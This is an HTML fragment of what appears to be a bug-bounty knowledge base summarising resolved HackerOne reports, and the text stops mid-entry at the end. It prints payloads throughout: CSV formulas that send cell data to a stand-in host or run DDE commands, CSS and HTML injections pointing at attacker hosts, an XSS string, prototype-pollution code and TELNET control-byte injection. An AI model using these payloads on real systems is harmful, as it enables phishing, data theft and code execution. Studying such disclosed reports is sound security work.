+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/980599" target="_blank" rel="noopener">hackerone.com/reports/980599</a></span><a class="src" href="#report-980599" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-3789570" style="--sv:var(--sev-low)" data-sev="1" data-votes="65" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Arbitrary SIP header injection via incomplete header blocklist</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#3789570</b> · 8x8-bounty · USD 100 · 65 votes · resolved</div>
+<div class="taxo"><span>Program <b>8x8-bounty</b></span><span>Surface <b>other</b></span><span>Chain <b>Rayo IQ -&gt; Jigasi extraHeaders -&gt; SIP INVITE header in</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A Prosody filter stripped only three named internal headers from client Rayo &lt;dial&gt; stanzas and forwarded all other client-supplied headers unfiltered to Jigasi, which injected each entry verbatim into outbound SIP INVITEs.</p>
+<h4>Method</h4><ol><li>As a user with outbound-call rights, send a Rayo &lt;dial&gt; IQ with extra headers</li><li>Include identity headers not in the 3-name blocklist</li><li>Jigasi copies them into the INVITE, spoofing caller ID to the SIP peer</li></ol>
+<div class="pre">&lt;dial ...&gt;&lt;header name="P-Asserted-Identity" value="sip:ceo@victim"/&gt;&lt;header name="Remote-Party-ID" value="..."/&gt;&lt;/dial&gt;</div>
+<p class="insight"><b>Insight —</b> Blocklists that strip only a handful of known-bad header names are almost always bypassable; test any not-listed header (P-Asserted-Identity, Remote-Party-ID, X-*). Correct control is an allowlist. Look for header pass-through between protocol gateways.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3789570" target="_blank" rel="noopener">hackerone.com/reports/3789570</a></span><a class="src" href="#report-3789570" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1536899" style="--sv:var(--sev-low)" data-sev="1" data-votes="52" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Stored HTML injection in transactional email</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1536899</b> · acronis · none · 52 votes · resolved</div>
+<div class="taxo"><span>Program <b>acronis</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">The 'first name' field of an email invitation was reflected unsanitized into the HTML welcome email body; an attacker registering a victim's email injects arbitrary HTML (links/images) rendered when the victim opens the trusted mail.</p>
+<h4>Method</h4><ol><li>Register/invite using the victim email and inject HTML into the first-name field</li><li>Victim confirms and receives the welcome email</li><li>Injected HTML (fake login link, image) renders inside the branded email</li></ol>
+<div class="pre">First Name: "/&gt;&lt;img src="x"&gt;&lt;a href="https://evil.com"&gt;login&lt;/a&gt;</div>
+<p class="insight"><b>Insight —</b> Any user-controlled field echoed into an HTML email is a stored-HTML/phishing sink. Email clients strip JS so impact is content-spoofing, but a trusted-brand email carrying an attacker link is high-conviction phishing. Test name/subject fields for tag injection.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1536899" target="_blank" rel="noopener">hackerone.com/reports/1536899</a></span><a class="src" href="#report-1536899" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2541027" style="--sv:var(--sev-low)" data-sev="1" data-votes="40" data-bounty="150">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Inconsistent sanitization between persistence and websocket broadcast paths</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2541027</b> · mattermost · USD 150 · 40 votes · resolved</div>
+<div class="taxo"><span>Program <b>mattermost</b></span><span>Surface <b>web</b></span><span>Chain <b>crafted embed -&gt; broadcast to all channel viewers -&gt; p</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Post metadata was sanitized when saved to the DB but not when the same post was broadcast over websockets, so a crafted metadata.embeds object reached clients unsanitized - allowing spoofed permalink/opengraph embeds and a type-confusion crash.</p>
+<h4>Method</h4><ol><li>POST /api/v4/posts with metadata.embeds crafted (permalink with attacker-chosen user/message, or opengraph YouTube with arbitrary target URL)</li><li>The realtime websocket 'posted' event delivers the raw embed to viewers</li><li>For DoS, set embed post.message to an array (non-string) to white-screen webapp/desktop clients</li></ol>
+<div class="pre">metadata:{embeds:[{type:'permalink',data:{post:{user_id:'SYSTEM',message:['crash']},channel_display_name:'can-be-anything'}}]}</div>
+<p class="insight"><b>Insight —</b> When the same object travels a validated (DB) and an unvalidated (websocket/broadcast) path, test the second path directly. Type-confusion (string vs array) in client renderers is a cheap stored DoS; broadcast embeds enable convincing spoofing.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2541027" target="_blank" rel="noopener">hackerone.com/reports/2541027</a></span><a class="src" href="#report-2541027" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2215578" style="--sv:var(--sev-low)" data-sev="1" data-votes="34" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>libcurl cookie injection via 'none' file (CVE-2023-38546)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2215578</b> · ibb · awarded · 34 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">curl_easy_duphandle clones the cookie-enabled state but not the cookies; if no cookie file was loaded the clone stores the filename literally as 'none', so a later transfer silently reads cookies from a file named 'none' in the CWD.</p>
+<h4>Method</h4><ol><li>App creates an easy handle with cookies enabled but loads no cookie file</li><li>App calls curl_easy_duphandle and reuses the clone</li><li>If a readable file './none' exists in CWD, its cookies are injected into the request</li></ol>
+<div class="pre"># Attacker drops a valid Netscape cookie-jar named exactly:
+./none
+# in the working directory of any program using libcurl in this pattern</div>
+<p class="insight"><b>Insight —</b> Library primitives can carry surprising filename defaults; when a program uses libcurl duphandle, a plant-a-file-named-'none' primitive lets you inject cookies. Review third-party lib CVEs for exploitable-in-context conditions.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2215578" target="_blank" rel="noopener">hackerone.com/reports/2215578</a></span><a class="src" href="#report-2215578" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-601192" style="--sv:var(--sev-low)" data-sev="1" data-votes="17" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Reflected HTML/CSS injection via query param inserted into DOM</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#601192</b> · shopify · none · 17 votes · resolved</div>
+<div class="taxo"><span>Program <b>shopify</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A query parameter (candidate) is written into the DOM without filtering (only '=' is blocked), allowing arbitrary HTML/CSS injection; script-based XSS is stopped by browser auditor but CSS injection remains.</p>
+<h4>Method</h4><ol><li>Put HTML/CSS markup in the ?candidate= parameter (avoid '=').</li><li>Value is reflected into the DOM unescaped; use &lt;style&gt; for CSS injection (external resource load / redress).</li></ol>
+<div class="pre">https://interviewing.shopify.com/index.php?candidate=z%3Cstyle%3E%20*%20{%20background:%20url(https://ATTACKER/x.png)%20}</div>
+<p class="insight"><b>Insight —</b> When a reflected sink blocks only a single character (here '='), pivot to payloads that avoid it: CSS injection via &lt;style&gt; needs no '='-dependent attributes and still loads remote resources / redresses the page under the trusted origin.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/601192" target="_blank" rel="noopener">hackerone.com/reports/601192</a></span><a class="src" href="#report-601192" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-2148242" style="--sv:var(--sev-low)" data-sev="1" data-votes="14" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>curl cookie injection via a file named 'none' (CVE-2023-38546)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#2148242</b> · curl · none · 14 votes · resolved</div>
+<div class="taxo"><span>Program <b>curl</b></span><span>Surface <b>other</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">When no cookie file is set, Curl_cookie_init() stores the filename as the literal string 'none'. On curl_easy_duphandle() the clone re-initializes cookies from the parent's filename ('none'), so if a real file called 'none' exists in the process cwd it is parsed as a Netscape cookie jar, injecting attacker cookies.</p>
+<h4>Method</h4><ol><li>Application uses libcurl, enables cookies but sets no cookie file, then calls curl_easy_duphandle()</li><li>Attacker plants a file named 'none' (Netscape cookie format) in the app's working directory</li><li>The duplicated handle loads 'none' and sends the injected cookies on subsequent requests</li></ol>
+<div class="pre">echo -e "127.0.0.1\tTRUE\t/\tFALSE\t0\tname\tvalue" &gt; none</div>
+<p class="insight"><b>Insight —</b> Sentinel/placeholder strings ('none', 'default', '-') that later get treated as real paths are a recurring bug class. When auditing libraries, look for where an unset value is stringified and later reopened as a file.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/2148242" target="_blank" rel="noopener">hackerone.com/reports/2148242</a></span><a class="src" href="#report-2148242" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1912770" style="--sv:var(--sev-low)" data-sev="1" data-votes="11" data-bounty="480">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>TELNET IAC / option injection via unsanitized username &amp; telnet options (CVE-2023-27533)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1912770</b> · ibb · USD 480 · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>other</b></span></div>
+<h4>Root cause</h4><p style="margin:0">curl passes user-supplied TELNET username and options (TTYPE, XDISPLOC, NEW_ENV) into the protocol stream without scrubbing, so an attacker controlling any of that data can embed IAC control sequences and negotiate/inject TELNET commands the application never intended.</p>
+<h4>Method</h4><ol><li>Find an app that lets attacker-controlled data flow into a curl TELNET URL's username or option values</li><li>Embed TELNET IAC/option bytes in TTYPE/XDISPLOC/NEW_ENV values</li><li>Injected sequences perform unintended option negotiation or inject input as if typed</li></ol>
+<div class="pre"># attacker-controlled telnet option value carrying IAC (0xFF) sequences
+# via TTYPE / XDISPLOC / NEW_ENV -&gt; unintended TELNET negotiation</div>
+<p class="insight"><b>Insight —</b> When user data is forwarded verbatim into a stateful, in-band protocol (TELNET, SMTP, FTP control, LDAP), look for the protocol's escape/control bytes (here IAC 0xFF) to break out of the data plane into the command plane. Fix here: accept only ASCII.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1912770" target="_blank" rel="noopener">hackerone.com/reports/1912770</a></span><a class="src" href="#report-1912770" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-310443" style="--sv:var(--sev-low)" data-sev="1" data-votes="11" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>lodash prototype pollution via __proto__ merge (CVE-2018-3721)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#310443</b> · nodejs-ecosystem · none · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>api</b></span><span>Chain <b>prototype pollution -&gt; DoS (toString/valueOf clobber brea</b></span><span>Tag <b>file-upload</b></span></div>
+<h4>Root cause</h4><p style="margin:0">merge/mergeWith/defaultsDeep recursively copy attacker JSON; a __proto__ key walks into Object.prototype, letting an attacker add/override properties (e.g. clobber toString/valueOf) present on every object -&gt; guaranteed DoS, sometimes RCE via gadgets.</p>
+<h4>Method</h4><ol><li>Find a deep-merge/extend of user-controlled JSON into an object</li><li>Send {"__proto__":{"polluted":"x"}} (or clobber toString/valueOf)</li><li>Verify pollution on a fresh {}; clobbering toString/valueOf 500s every later request</li></ol>
+<div class="pre">var _ = require('lodash');
+var malicious = '{"__proto__":{"oops":"It works !"}}';
+_.merge({}, JSON.parse(malicious));
+console.log(({}).oops); // It works !</div>
+<p class="insight"><b>Insight —</b> Prototype pollution is the canonical deep-merge bug: any recursive merge/clone/defaults over user JSON is a sink. Confirm with __proto__, then escalate — clobber toString/valueOf for DoS, or chain library gadgets for RCE. Multipart/query parsers that build nested objects from keys are also sinks (see 804772).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/310443" target="_blank" rel="noopener">hackerone.com/reports/310443</a></span><a class="src" href="#report-310443" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-844428" style="--sv:var(--sev-low)" data-sev="1" data-votes="11" data-bounty="100">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Apache Solr LocalParams injection (backslash-powered)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#844428</b> · eternal · USD 100 · 11 votes · resolved</div>
+<div class="taxo"><span>Program <b>eternal</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A city parameter is passed into a Solr query where Solr LocalParams/query syntax is interpreted; a lone backslash breaks the query (500) while an escaped double backslash restores it (200), proving server-side query injection.</p>
+<h4>Method</h4><ol><li>Send the param with a single trailing backslash and note HTTP 500</li><li>Send the param with a double backslash and note HTTP 200</li><li>Conclude the value is parsed as Solr query syntax -&gt; LocalParams injection</li></ol>
+<div class="pre">GET /webapi/searchapi.php?city=51\    -&gt; 500
+GET /webapi/searchapi.php?city=51\\   -&gt; 200</div>
+<p class="insight"><b>Insight —</b> Backslash-powered differential (single vs double backslash flipping error/OK) is a generic detector for any query-language sink, not just SQL - here it reveals Solr injection which can escalate to data access/RCE via known Solr params.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/844428" target="_blank" rel="noopener">hackerone.com/reports/844428</a></span><a class="src" href="#report-844428" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-953203" style="--sv:var(--sev-low)" data-sev="1" data-votes="8" data-bounty="150">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Apache Solr query injection via LocalParams in unsanitized param</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#953203</b> · eternal · $150 · 8 votes · resolved</div>
+<div class="taxo"><span>Program <b>eternal</b></span><span>Surface <b>api</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A request parameter (city_id) is passed unsanitized into a Solr query, letting the attacker inject Solr LocalParams syntax ({!dismax ...}) to change the query parser/behavior.</p>
+<h4>Method</h4><ol><li>Find an API param that feeds a Solr backend.</li><li>Inject a LocalParams prefix to override the query parser/field.</li><li>Confirm altered query behavior in the JSON response.</li></ol>
+<div class="pre">:v2/red/homepage.json?lat=&amp;lon=&amp;city_id={!dismax+df=city_id}86&amp;android_country=US&amp;lang=en&amp;android_language=en</div>
+<p class="insight"><b>Insight —</b> Numeric-looking search params often flow straight into Solr/Elasticsearch. Test with {!...} LocalParams (e.g. {!dismax}, {!type=...}) to detect Solr query injection; it can change parsing, leak data, or DoS. Same technique seen on a sibling endpoint (#844428).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/953203" target="_blank" rel="noopener">hackerone.com/reports/953203</a></span><a class="src" href="#report-953203" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-126109" style="--sv:var(--sev-low)" data-sev="1" data-votes="7" data-bounty="1000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV / formula injection via user-controlled field in CSV export</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#126109</b> · uber · 1000 · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>uber</b></span><span>Surface <b>web</b></span><span>Chain <b>stored formula -&gt; victim spreadsheet -&gt; HYPERLINK/WEBS</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled data (a username) that begins with =, +, -, @ is written unescaped into an exported CSV; when a victim opens it in a spreadsheet, the field is evaluated as a formula, enabling data exfiltration (HYPERLINK) and DDE command execution.</p>
+<h4>Method</h4><ol><li>Set a controllable field (name, note) to a formula payload</li><li>Have a privileged user (another admin) export/download the CSV of records</li><li>On open in Excel/Sheets the formula executes: HYPERLINK exfiltrates adjacent cells; cmd DDE spawns a process</li></ol>
+<div class="pre">=HYPERLINK("https://COLLAB/x?d="&amp;A1,"Click to view additional information")
+=cmd|' /C calc'!A0
+# also prefix variants: +, -, @ ; break-out: "=1+1</div>
+<p class="insight"><b>Insight —</b> Any field that lands in an exported CSV/XLSX and starts with = + - @ is a formula-injection sink. Test even 'self-only' fields because a second privileged user often opens the export (admin-to-admin). Impact = cross-user data exfil (HYPERLINK/WEBSERVICE) and, if trusted, DDE command execution.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/126109" target="_blank" rel="noopener">hackerone.com/reports/126109</a></span><a class="src" href="#report-126109" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-783993" style="--sv:var(--sev-low)" data-sev="1" data-votes="7" data-bounty="1">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSS injection via URL param controlling stylesheet root (@import attacker CSS)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#783993</b> · clario · awarded · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>clario</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">A URL parameter (root) controls the base path from which the page loads/imports a stylesheet, letting an attacker point it at their own server so an attacker-hosted CSS file is imported and applied on the trusted origin.</p>
+<h4>Method</h4><ol><li>Set the root parameter to an attacker-controlled URL.</li><li>Host the expected CSS path on that server with malicious CSS (background/redress/resource load).</li><li>Load the page; the attacker stylesheet is @import-ed and rendered under the target origin.</li></ol>
+<div class="pre">https://static.mackeeper.com/landings/libs/alert/alerts/exitpopup74/exit-popup.php?root=https://ATTACKER/&amp;lang=en
+&lt;!-- ATTACKER/alert/alerts/exitpopup74/css/exit-popup.css --&gt;
+div{background-image:url("https://ATTACKER/x.gif");}</div>
+<p class="insight"><b>Insight —</b> Parameters named root/base/host/path that feed a stylesheet or resource loader are CSS/resource-injection sinks: pointing them off-origin imports attacker CSS (redress, exfil via CSS selectors, resource load) and borders on open-redirect for resources.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/783993" target="_blank" rel="noopener">hackerone.com/reports/783993</a></span><a class="src" href="#report-783993" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-116189" style="--sv:var(--sev-low)" data-sev="1" data-votes="7" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Null-byte token bypasses route/validation (404 -&gt; 200)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#116189</b> · security · none · 7 votes · resolved</div>
+<div class="taxo"><span>Program <b>security</b></span><span>Surface <b>web</b></span><span>Tag <b>webhook</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Appending %00 plus extra data to an invitation_token that would otherwise 404 instead returns a 200 with the valid page, showing the token/route validation truncates or mishandles the null byte inconsistently between the check and the lookup.</p>
+<h4>Method</h4><ol><li>Find an endpoint that 404s on an invalid token and 200s on a valid one.</li><li>Append %00 and trailing content to a valid token value and observe the response still 200s (validation bypassed).</li><li>Probe the reflected/derived value for further injection (here it was HTML-escaped, so no XSS).</li></ol>
+<div class="pre">https://TARGET/users/sign_in?invitation_token=eda8fca985bc4d4ef21f269ed2a24951%00"&gt;&lt;img src=x onerror=prompt(1) x=</div>
+<p class="insight"><b>Insight —</b> A null byte can desynchronize a validation check from the value actually used, turning invalid input into accepted input. Worth testing on token/id/filename params even when the immediate reflection is escaped; the parsing inconsistency itself is the reusable primitive.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/116189" target="_blank" rel="noopener">hackerone.com/reports/116189</a></span><a class="src" href="#report-116189" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-226335" style="--sv:var(--sev-low)" data-sev="1" data-votes="6" data-bounty="500">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Terminal escape-sequence injection via untrusted metadata (RubyGems summary)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#226335</b> · rubygems · $500 · 6 votes · resolved</div>
+<div class="taxo"><span>Program <b>rubygems</b></span><span>Surface <b>other</b></span><span>Tag <b>supply-chain</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Attacker-controlled strings (gem summary, auth log usernames) are printed to a terminal verbatim, so embedded ANSI/xterm escape sequences are interpreted by the victim's terminal emulator — enabling title/clipboard manipulation and, on vulnerable emulators, command injection into the terminal. CVE-2017-0899.</p>
+<h4>Method</h4><ol><li>Embed escape sequences in a field that will later be echoed to someone's terminal</li><li>Publish/push so a victim renders it with a CLI tool (gem query -d, tailing logs)</li><li>Escape codes execute in the victim's terminal (window-title change is the harmless tell)</li></ol>
+<div class="pre"># gemspec field:
+spec.summary = "foo\e[31mbar\e[0mbaz \e]2;BOOM!\a"
+# rendered via: gem query &lt;name&gt; -d</div>
+<p class="insight"><b>Insight —</b> Anything that prints untrusted text to a terminal (package registry CLIs, log viewers, CI output, git output) should strip control characters. Test by injecting \e]2;PWNED\a (OSC window-title) — if the terminal title changes, escape sequences pass through and the surface may be escalatable on emulators with dangerous escape handlers.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/226335" target="_blank" rel="noopener">hackerone.com/reports/226335</a></span><a class="src" href="#report-226335" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-224291" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>CSV / spreadsheet formula injection via export feature</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#224291</b> · weblate · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>weblate</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled fields (glossary names, profile data) are written verbatim into exported CSV. Spreadsheet apps interpret any cell beginning with = + - @ as a formula, enabling DDE/command execution or data exfiltration when a victim opens the file.</p>
+<h4>Method</h4><ol><li>Store a value beginning with a formula trigger in any field that appears in a CSV/XLSX export.</li><li>Have a victim export and open the file in Excel/LibreOffice/Sheets.</li><li>Formula executes (calc via DDE, or =HYPERLINK/WEBSERVICE to exfiltrate other cells).</li></ol>
+<div class="pre">=1+1
+-2+3+cmd|' /C calc'!G2
+=HYPERLINK("http://COLLAB/?"&amp;A1,"click")
+@SUM(1+1)*cmd|'/C calc'!A0
+// defensive tell: prefix cells with a single quote or space to neutralize</div>
+<p class="insight"><b>Insight —</b> Any place user data flows into a downloadable CSV/XLSX is a formula-injection sink even when the app itself is not vulnerable; impact is client-side code exec / data theft against whoever opens the export (often staff/admins).</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/224291" target="_blank" rel="noopener">hackerone.com/reports/224291</a></span><a class="src" href="#report-224291" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-22093" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="200">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Text injection / content spoofing via reflected error &amp; path parameters</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#22093</b> · slack · 200 · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>slack</b></span><span>Surface <b>web</b></span></div>
+<h4>Root cause</h4><p style="margin:0">User-controlled input (error/message query params, path segments, or API error-detail fields) is reflected verbatim into the response body without sanitization, letting an attacker plant arbitrary human-readable text (fake login notices, 'move to evil.com') on a trusted domain for phishing.</p>
+<h4>Method</h4><ol><li>Find a page/endpoint that echoes an input into the body: error/message/type query params, 404/403 pages, or JSON API error strings.</li><li>Inject plain text (no HTML needed) instructing the victim to act, e.g. 'go to evil.com'.</li><li>Send the crafted trusted-domain URL to victims; the text renders as if it were official site content.</li></ol>
+<div class="pre">https://team.slack.com/services/new/github?error=Content%20Spoofing
+https://withinsecurity.com/wp-login.php?error=Please%20log%20in%20through%20attacker.com
+https://www.udemy.com/api-2.0/recommended-courses/?source_action=view&amp;source_object=course&amp;source_object_id=},{Kindly%20move%20to%20our%20new%20beta%20website%20evil.com&amp;source_page=clp
+https://hosted.weblate.org/translate/debian-reference/translations/fr/?type=Sorry,%20system%20trouble,%20go%20to%20http://evil.example/attack.php
+https://status.algolia.com/clusters/For%20more%20info%20go%20to%20www.evil.com</div>
+<p class="insight"><b>Insight —</b> Any parameter or path segment reflected into an error message, status page, or JSON error 'detail' is a text-injection sink. Even without HTML/JS execution it is a phishing primitive on a trusted origin; test error= / message= / type= params, custom 404/403 bodies, and API validation errors that echo your input.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/22093" target="_blank" rel="noopener">hackerone.com/reports/22093</a></span><a class="src" href="#report-22093" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-1891474" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Protocol control-byte injection: unescaped Telnet IAC in curl options (CVE-2023-27533)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#1891474</b> · curl · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>curl</b></span><span>Surface <b>other</b></span><span>Chain <b>attacker-controlled telnet option -&gt; unescaped IAC -&gt; </b></span></div>
+<h4>Root cause</h4><p style="margin:0">curl builds Telnet suboption data (TTYPE/XDISPLOC/NEW_ENV) from user-controlled CURLOPT_TELNETOPTIONS values without encoding the 'Interpret As Command' byte (IAC, 0xff), so an embedded 0xff escapes the subnegotiation and injects arbitrary TELNET commands.</p>
+<h4>Method</h4><ol><li>Control a telnet option value (TTYPE/XDISPLOC/NEW_ENV) passed to curl.</li><li>Embed a raw 0xff (IAC) byte plus command bytes in the value.</li><li>curl emits it unescaped; the byte is parsed as a protocol command, escaping the subnegotiation.</li></ol>
+<div class="pre">curl --telnet-option NEW_ENV=a,b$(echo -ne "\xff\xf0INJECTED") telnet://server
+# wire: ... 0x61 0x62 ff f0 'INJECTED' ...  (IAC SE injected)</div>
+<p class="insight"><b>Insight —</b> Any protocol that uses an in-band escape/control byte (Telnet IAC 0xff, SMTP/CRLF, IRC newline, NUL) is injectable when user data isn't encoded before being framed. When you can influence protocol option/header values, insert the control byte and watch (tcpdump) for it altering the protocol stream.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1891474" target="_blank" rel="noopener">hackerone.com/reports/1891474</a></span><a class="src" href="#report-1891474" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec hidden" id="report-311333" style="--sv:var(--sev-low)" data-sev="1" data-votes="4" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Prototype pollution via recursive object merge/extend (__proto__)</h3><span class="fieldmark">◆ Low</span></div>
+<div class="catalog">Specimen <b>#311333</b> · nodejs-ecosystem · none · 4 votes · resolved</div>
+<div class="taxo"><span>Program <b>nodejs-ecosystem</b></span><span>Surface <b>other</b></span><span>Chain <b>prototype pollution -&gt; overwrite toString/valueOf -&gt; E</b></span></div>
+<h4>Root cause</h4><p style="margin:0">Recursive deep-merge/extend/clone helpers copy attacker-controlled keys onto the target without skipping __proto__, so a JSON payload with a __proto__ key writes onto Object.prototype and affects every object in the process.</p>
+<h4>Method</h4><ol><li>Find a sink that deep-merges user JSON into an object (config merge, query/body parser, options extend)</li><li>Send a JSON body whose top level contains a __proto__ object with the properties to inject</li><li>Verify pollution: a fresh empty object now returns the injected property</li><li>Escalate: overwrite toString/valueOf to break Express (guaranteed DoS) or inject gadget properties toward RCE</li></ol>
+<div class="pre">var merge = require('deep-extend');
